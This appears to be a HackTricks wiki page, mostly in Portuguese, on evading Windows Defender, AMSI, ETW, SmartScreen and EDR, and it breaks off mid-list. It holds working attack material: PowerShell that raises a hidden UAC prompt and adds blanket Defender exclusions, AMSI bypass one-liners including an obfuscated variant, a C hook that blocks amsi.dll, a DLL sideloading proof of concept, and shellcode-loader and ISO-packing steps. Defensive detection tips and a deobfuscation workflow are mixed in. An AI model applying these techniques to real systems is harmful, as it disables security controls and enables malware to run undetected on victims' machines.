# Antivírus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): A tool to stop Windows Defender from working.
- [no-defender](https://github.com/es3n1n/no-defender): A tool to stop Windows Defender from working faking another AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo instalador antes de mexer no Defender

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. The flow is simple:

1. Probe for administrative context with `net session`. The command only succeeds when the caller holds admin rights, so a failure indicates the loader is running as a standard user.
2. Immediately relaunch itself with the `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software "crackeado", então o prompt geralmente é aceito, concedendo ao malware os direitos necessários para alterar a política do Defender.

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Uma vez com privilégios elevados, cadeias no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço totalmente. O loader primeiro finaliza o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e então aplica **exclusões extremamente amplas** para que cada perfil de usuário, diretório do sistema e disco removível não possam ser escaneados:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observações principais:

- O loop percorre todos os sistemas de ficheiros montados (D:\, E:\, pendrives USB, etc.), então **qualquer payload futuro deixado em qualquer lugar do disco é ignorado**.
- A exclusão da extensão `.sys` é prospectiva—os atacantes reservam a opção de carregar drivers não assinados mais tarde sem tocar no Defender novamente.
- Todas as alterações são colocadas em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que fases posteriores confirmem que as exclusões persistem ou as expandam sem reativar o UAC.

Como nenhum serviço do Defender é interrompido, verificações de saúde ingênuas continuam a reportar “antivírus ativo” mesmo que a inspeção em tempo real nunca alcance esses caminhos.

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um ficheiro é malicioso ou não: static detection, dynamic analysis e, nos EDRs mais avançados, behavioural analysis.

### **Static detection**

Static detection é alcançada ao sinalizar strings conhecidas maliciosas ou arrays de bytes num binário ou script, e também extraindo informação do próprio ficheiro (por exemplo descrição do ficheiro, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isto significa que usar ferramentas públicas conhecidas pode levá-lo a ser apanhado com mais facilidade, já que provavelmente foram analisadas e marcadas como maliciosas. Há algumas maneiras de contornar este tipo de deteção:

- **Encryption**

Se encriptar o binário, não haverá forma do AV detetar o seu programa, mas vai precisar de algum tipo de loader para decriptar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo o que precisa é mudar algumas strings no seu binário ou script para passar pelo AV, mas isto pode ser uma tarefa demorada dependendo do que está a tentar ofuscar.

- **Custom tooling**

Se desenvolver as suas próprias ferramentas, não haverá assinaturas conhecidas más, mas isto requer muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a static detection do Windows Defender é o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o ficheiro em múltiplos segmentos e pede ao Defender para analisar cada um individualmente; assim, pode dizer-lhe exatamente quais as strings ou bytes sinalizados no seu binário.

Recomendo vivamente que consulte esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion prática.

### **Dynamic analysis**

Dynamic analysis é quando o AV executa o seu binário numa sandbox e observa atividade maliciosa (por exemplo, tentar decriptar e ler as passwords do navegador, realizar um minidump no LSASS, etc.). Esta parte pode ser um pouco mais complicada de contornar, mas aqui estão algumas coisas que pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como é implementado, pode ser uma excelente forma de contornar o dynamic analysis dos AVs. Os AVs têm um tempo muito curto para analisar ficheiros para não interromper o fluxo de trabalho do utilizador, por isso usar longos sleeps pode atrapalhar a análise dos binários. O problema é que muitos sandboxes de AV podem simplesmente ignorar o sleep, dependendo de como foi implementado.
- **Checking machine's resources** Normalmente as sandboxes têm muito poucos recursos para trabalhar (por exemplo < 2GB RAM), caso contrário poderiam abrandar a máquina do utilizador. Também pode ser bastante criativo aqui, por exemplo verificando a temperatura da CPU ou até as velocidades das ventoinhas; nem tudo será implementado na sandbox.
- **Machine-specific checks** Se quiser direcionar um utilizador cuja workstation está ligada ao domínio "contoso.local", pode fazer uma verificação ao domínio do computador para ver se corresponde ao que especificou; se não corresponder, pode fazer o seu programa sair.

Acontece que o nome do computador da sandbox do Microsoft Defender é HAL9TH, então pode verificar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, significa que está dentro da sandbox do Defender, logo pode fazer o seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como já dissemos antes neste post, **ferramentas públicas** serão eventualmente **detectadas**, por isso deve fazer a si mesmo(a) a seguinte pergunta:

Por exemplo, se quiser fazer um dump do LSASS, **realmente precisa de usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também faça o dump do LSASS.

A resposta certa é provavelmente a última. Tomando o mimikatz como exemplo, é provavelmente um dos — se não o mais — sinalizados por AVs e EDRs; embora o projeto seja muito bom, é também um pesadelo para contornar AVs, por isso procure alternativas para o que pretende alcançar.

> [!TIP]
> Ao modificar os seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no defender e, por favor, a sério, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se o seu objetivo é alcançar evasão a longo prazo. Se quiser verificar se o seu payload é detetado por um AV em particular, instale-o numa VM, tente desativar o envio automático de amostras e teste aí até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize usar DLLs para evasão**, na minha experiência, ficheiros DLL são normalmente **muito menos detectados** e analisados, por isso é um truque simples para evitar deteção em alguns casos (se o seu payload tiver alguma forma de correr como uma DLL, claro).

Como podemos ver nesta imagem, um DLL payload do Havoc tem uma taxa de deteção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me entre um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>

Agora mostramos alguns truques que pode usar com ficheiros DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de procura de DLLs usada pelo loader, posicionando tanto a aplicação vítima quanto o(s) payload(s) malicioso(s) lado a lado.

Pode procurar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**, essa técnica é bastante stealthy quando feita corretamente, mas se você usar programas DLL Sideloadable de conhecimento público, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja executado, pois o programa espera algumas funções específicas dentro daquela DLL; para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) do [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um template de código-fonte DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos com mais profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules podem exportar funções que são na verdade "forwarders": em vez de apontarem para código, a entrada de export contém uma string ASCII da forma `TargetDll.TargetFunc`. Quando um caller resolve o export, o Windows loader irá:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Key behaviors to understand:
- Se `TargetDll` for um KnownDLL, ele é fornecido pelo namespace protegido KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Se `TargetDll` não for um KnownDLL, a ordem normal de busca de DLLs é usada, que inclui o diretório do módulo que está realizando a resolução do forward.

Isso habilita uma primitive de sideloading indireto: encontre um signed DLL que exporte uma função encaminhada para um nome de módulo que não seja KnownDLL, então coloque esse signed DLL no mesmo diretório de um attacker-controlled DLL com exatamente o mesmo nome do módulo alvo encaminhado. Quando o forwarded export for invocado, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, então é resolvida pela ordem normal de pesquisa.

PoC (copiar e colar):
1) Copie a DLL do sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (signed) carrega o side-by-side `keyiso.dll` (signed)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro "missing API" somente depois que o `DllMain` já tiver sido executado

Dicas de detecção:
- Foque em forwarded exports onde o módulo alvo não é um KnownDLL. KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitore LOLBins (p.ex., rundll32.exe) carregando DLLs assinadas de caminhos não do sistema, seguido pelo carregamento de non-KnownDLLs com o mesmo nome base nesse diretório
- Gere alertas em cadeias processo/módulo como: `rundll32.exe` → não-do-sistema `keyiso.dll` → `NCRYPTPROV.dll` sob caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um toolkit de payload para contornar EDRs usando processos suspensos, syscalls diretos e métodos alternativos de execução`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasão é um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta — se possível, tente encadear múltiplas técnicas de evasão.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os antivírus só eram capazes de escanear **arquivos no disco**, então se você de alguma forma conseguisse executar payloads **directly in-memory**, o AV não conseguia fazer nada para impedir, pois não tinha visibilidade suficiente.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ela permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo dos scripts de forma não criptografada e não ofuscada.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele antepõe `amsi:` e depois o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Além disso, a partir do **.NET 4.8**, código C# também é executado através do AMSI. Isso até afeta `Assembly.Load(byte[])` para execução in-memory. Por isso, recomenda-se usar versões mais antigas do .NET (como 4.7.2 ou inferiores) para execução in-memory se você quiser tentar evadir o AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Como o AMSI trabalha principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evitar detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham múltiplas camadas, então obfuscation pode ser uma opção ruim dependendo de como for feita. Isso torna a evasão não tão direta. Embora, às vezes, tudo o que você precise fazer seja mudar alguns nomes de variáveis e já resolve, então depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também em cscript.exe, wscript.exe, etc.), é possível mexer nisso facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas formas de evadir o escaneamento do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhum scan seja iniciado para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir o uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, claro, foi sinalizada pelo próprio AMSI, então é necessária alguma modificação para usar esta técnica.

Aqui está um bypass AMSI modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado quando esta postagem for publicada; portanto, você não deve publicar nenhum código se pretende permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê‑la com instruções para retornar o código E_INVALIDARG; dessa forma, o resultado da verificação real retornará 0, que é interpretado como resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Existem também muitas outras técnicas usadas para bypass do AMSI com powershell — confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando o AMSI impedindo o carregamento de amsi.dll (LdrLoadDll hook)

AMSI é inicializado apenas depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e agnóstico quanto à linguagem é colocar um hook em modo usuário em `ntdll!LdrLoadDll` que retorna um erro quando o módulo requisitado é `amsi.dll`. Como resultado, o AMSI nunca carrega e nenhuma varredura ocorre para esse processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e em loaders personalizados (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts pelo stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Visto sendo usado por loaders executados através de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**
Se você usar PowerShell versão 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isto:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evitar a detecção**.

Para contornar o PowerShell logging, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Use Powershell version 2**: se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnar um PowerShell sem defesas (isso é o que `powerpick` do Cobal Strike usa).


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem de criptografar dados, o que aumentará a entropia do binário e facilitará a detecção por AVs and EDRs. Tenha cuidado com isso e, talvez, aplique criptografia somente em seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum enfrentar várias camadas de proteção que bloqueiam decompiladores e sandboxes. O fluxo de trabalho abaixo **restaura de forma confiável um IL quase original** que depois pode ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Anti-tampering removal – ConfuserEx criptografa cada *method body* e o descriptografa dentro do construtor estático do *module* (`<Module>.cctor`). Isso também modifica o checksum do PE, então qualquer modificação fará o binário travar. Use **AntiTamperKiller** para localizar as tabelas de metadata criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Symbol / control-flow recovery – alimente o arquivo *clean* para **de4dot-cex** (um fork do de4dot compatível com ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil ConfuserEx 2  
• de4dot irá desfazer o control-flow flattening, restaurar namespaces, classes e nomes de variáveis originais e descriptografar strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas de método por wrappers leves (também chamados de *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após este passo você deverá observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário resultante no dnSpy, pesquise por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *payload* real. Frequentemente o malware o armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – útil quando se trabalha em uma workstation offline.

> 🛈  ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software através de code obfuscation e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, obfuscated code sem usar nenhuma ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de obfuscated operations geradas pelo framework de C++ template metaprogramming que tornará a vida de quem quiser crackear a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um x64 binary obfuscator capaz de obfuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um simple metamorphic code engine para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um fine-grained code obfuscation framework para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). ROPfuscator obfusca um programa no nível de assembly ao transformar instruções regulares em ROP chains, frustrando nossa concepção natural de controle de fluxo normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas acionarão o SmartScreen alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais informações -> Executar assim mesmo).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é automaticamente criado ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o Zone.Identifier ADS para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um **certificado de assinatura confiável** **não acionarão o SmartScreen**.

Uma forma muito eficaz de impedir que seus payloads recebam a Mark of The Web é embalá-los dentro de algum tipo de contêiner, como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **cannot** ser aplicado a **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração para bypassing SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um mecanismo poderoso de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Semelhante a como a AMSI é desabilitada (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente sem registar quaisquer eventos. Isso é feito patchando a função na memória para retornar imediatamente, desabilitando efetivamente o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# em memória é conhecido há bastante tempo e continua sendo uma ótima forma de executar suas ferramentas de post-exploitation sem ser detectado por AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só teremos que nos preocupar em patchar a AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornecem a capacidade de executar assemblies C# diretamente em memória, mas há diferentes formas de fazer isso:

- **Fork\&Run**

